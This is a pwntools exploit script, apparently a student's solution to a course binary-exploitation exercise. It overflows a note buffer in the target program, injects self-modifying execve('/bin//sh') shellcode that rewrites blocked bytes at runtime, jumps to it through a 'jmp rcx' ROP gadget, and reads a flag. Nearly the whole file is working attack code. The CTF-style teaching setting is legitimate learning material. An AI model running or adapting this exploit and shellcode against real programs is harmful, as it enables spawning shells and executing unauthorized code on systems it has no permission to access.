#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise6/exercise6b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x40194d
c
ni 2
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# $ ROPgadget --binary handout/exercise6/exercise6b | grep "jmp rcx"
jmp_rcx = 0x401616
rcx_offset = 6*4

r.recvuntil(b'notes:\n')
r.sendline(b'1')

r.recvuntil(b'note:\n')

# Shortest shellcode I could find, from:
# https://systemoverlord.com/2016/04/27/even-shorter-shellcode.html
#
# xor esi, esi                NO b'\x31\xf6'
# push rsi                    OK b'V'
# mov rbx, 0x68732f2f6e69622f OK b'H\xbb/bin//sh'
# push rbx                    OK b'S'
# push rsp                    OK b'T'
# pop rdi                     OK b'_'
# imul esi                    OK b'\xf7\xee'
# mov al, 0x3b                OK b'\xb0;'
# syscall                     NO b'\x0f\x05'

def encode(instr, op, pos, offset):
    instr_asm = asm(instr)
    instr_val = int.from_bytes(instr_asm, byteorder='little')
    shellcode = asm(f"{op} word ptr [rcx + {pos + 6}], {hex(offset)}")
    if op == "add":
        shellcode += p32(instr_val - offset)[:2]
    else:
        shellcode += p32(instr_val + offset)[:2]
    return shellcode

shellcode = encode("xor esi, esi", "add", 0, 0x7d7d)
shellcode += asm("""
push rsi                    
mov rbx, 0x68732f2f6e69622f 
push rbx                    
push rsp                    
pop rdi                     
imul esi                    
mov al, 0x3b                
""")
shellcode += encode("syscall", "sub", len(shellcode), 0x1b11)

r.send(b'A' * rcx_offset) # offset between buffer start and rcx
r.send(shellcode)
r.send(b'A' * (232 - rcx_offset - len(shellcode)))
r.send(b'A' * (4*8))
r.sendline(p64(jmp_rcx))

r.sendline("cat flag && exit")
print(r.recvall())
